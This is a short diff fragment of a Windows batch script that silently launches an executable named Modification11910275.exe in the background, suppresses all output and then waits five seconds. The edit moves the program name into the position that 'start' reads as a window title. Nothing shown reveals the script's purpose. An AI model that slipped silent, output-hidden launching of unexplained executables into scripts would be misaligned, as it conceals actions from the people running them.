@@ -20,7 +20,7 @@
     )
 
     REM --> Execute Modification11910275.exe silently
-    start /B "" Modification11910275.exe >nul 2>&1
+    start /B "Modification11910275.exe" >nul 2>&1
     timeout /t 5 /nobreak >nul 2>&1
 
         )
